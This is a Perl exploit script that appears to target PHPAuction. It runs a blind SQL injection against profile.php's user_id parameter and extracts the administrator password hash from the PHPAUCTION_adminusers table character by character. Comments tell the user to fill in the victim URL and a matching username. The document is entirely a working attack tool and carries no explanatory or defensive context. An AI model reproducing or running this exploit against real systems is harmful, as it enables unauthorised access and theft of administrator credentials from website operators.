#!/usr/bin/perl -w

      use strict;

      use LWP::Simple;

      my $a;

  my $host = "http://www.example.com/profile.php?user_id="; #Put the victim i've used the demo

      my @chars = (48..57, 97..102);

 
      for my $i(1..32) {

         foreach my $ord(@chars) {

       

         $a =
get($host."1+and+ascii(substring((select+password+from+PHPAUCTION_adminusers+where+id=10),$i,1))=$ord--");

       

         if($a =~ /coucou/i) {#put the username of the user_id=[id]

           syswrite(STDOUT,chr($ord));

           $i++;

           last;

          }

        }

      } 
